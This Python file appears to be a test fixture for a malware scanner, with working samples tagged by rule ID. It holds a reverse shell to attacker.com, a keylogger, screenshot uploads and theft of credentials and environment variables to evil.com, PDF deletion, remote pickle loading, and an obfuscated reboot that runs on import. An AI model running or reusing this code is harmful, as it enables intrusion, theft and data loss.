#!/usr/bin/env python3
"""
Malicious test script - contains dangerous patterns for scanner testing
DO NOT RUN THIS FILE
"""

import os
import subprocess
import requests
import socket
import base64

# EXEC001: Code execution
def malicious_eval():
    user_input = input("Enter code: ")
    result = eval(user_input)  # CRITICAL: Arbitrary code execution
    exec(compile(user_input, '<string>', 'exec'))  # CRITICAL
    return result

# EXEC002: System command execution
def run_command():
    cmd = input("Command: ")
    os.system(cmd)  # HIGH: System command injection
    subprocess.call(cmd, shell=True)  # HIGH
    subprocess.Popen(cmd, shell=True)  # HIGH

# NET001: Data exfiltration
def steal_data():
    # Collect sensitive info
    env_data = dict(os.environ)  # MEDIUM: Environment enumeration
    
    # Send to external server
    requests.post("http://192.168.1.100:8080/collect", json=env_data)  # MEDIUM: Hardcoded IP
    requests.post("https://evil-server.com/steal", data=env_data)  # MEDIUM

# NET002: Raw socket communication
def backdoor():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("attacker.com", 4444))  # HIGH: Suspicious outbound connection
    while True:
        cmd = s.recv(1024).decode()
        output = subprocess.check_output(cmd, shell=True)
        s.send(output)

# SUSPICIOUS001: Keylogger
def keylogger():
    from pynput import keyboard
    
    logged_keys = []
    
    def on_press(key):
        logged_keys.append(str(key))
        # Send to attacker every 100 keystrokes
        if len(logged_keys) >= 100:
            requests.post("http://evil.com/keys", data={"keys": logged_keys})
            logged_keys.clear()
    
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

# SUSPICIOUS002: Screen capture
def capture_screen():
    import pyautogui
    import time
    
    while True:
        screenshot = pyautogui.screenshot()  # HIGH: Unauthorized screen capture
        screenshot.save("/tmp/screen.png")
        # Upload screenshot
        with open("/tmp/screen.png", "rb") as f:
            requests.post("http://attacker.com/upload", files={"file": f})
        time.sleep(30)

# SUSPICIOUS003: Cryptominer
def mine_crypto():
    import hashlib
    
    # Connect to mining pool
    pool = "stratum+tcp://pool.minergate.com:45700"  # CRITICAL: Mining pool
    wallet = "0x1234567890abcdef1234567890abcdef12345678"  # CRITICAL
    
    print(f"Mining to {wallet} via {pool}")
    
    # Waste CPU cycles
    nonce = 0
    while True:
        data = f"block_data_{nonce}".encode()
        hash_result = hashlib.sha256(data).hexdigest()
        if hash_result.startswith("0000"):
            print(f"Found hash: {hash_result}")
        nonce += 1

# FILE001: Destructive file operations
def destroy_files():
    # Delete user files
    home = os.path.expanduser("~")
    for root, dirs, files in os.walk(home):
        for file in files:
            if file.endswith('.pdf'):
                os.remove(os.path.join(root, file))  # MEDIUM: File deletion
    
    # Wipe directory
    import shutil
    shutil.rmtree("/tmp/important_data")  # MEDIUM

# ENV001: Credential theft
def steal_credentials():
    # Try to get various credentials
    creds = {}
    
    try:
        creds['aws_key'] = os.environ['AWS_ACCESS_KEY_ID']  # HIGH
    except KeyError:
        pass
    
    try:
        creds['password'] = os.environ['PASSWORD']  # HIGH
    except KeyError:
        pass
    
    try:
        creds['token'] = os.environ['GITHUB_TOKEN']  # HIGH
    except KeyError:
        pass
    
    # Send credentials to attacker
    requests.post("https://evil.com/creds", json=creds)

# OBF001: Obfuscated code
exec(base64.b64decode("""
X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ3JlYm9vdCcpICAjIEhpZGRlbiByZWJvb3QgY29tbWFuZA==
"""))  # HIGH: Obfuscated malicious code

# DATA001: Unsafe deserialization
def load_payload():
    import pickle
    
    # Download and execute payload
    response = requests.get("http://evil.com/payload.dat")
    payload = pickle.loads(response.content)  # MEDIUM: Remote code execution via pickle
    return payload

# PERM001: Permission escalation
def escalate():
    os.chmod("/etc/passwd", 0o777)  # HIGH: System file modification
    os.setuid(0)  # HIGH: Privilege escalation attempt

if __name__ == "__main__":
    # Run all malicious functions
    malicious_eval()
    run_command()
    steal_data()
    backdoor()
    keylogger()
    capture_screen()
    mine_crypto()
    destroy_files()
    steal_credentials()
    load_payload()
    escalate()
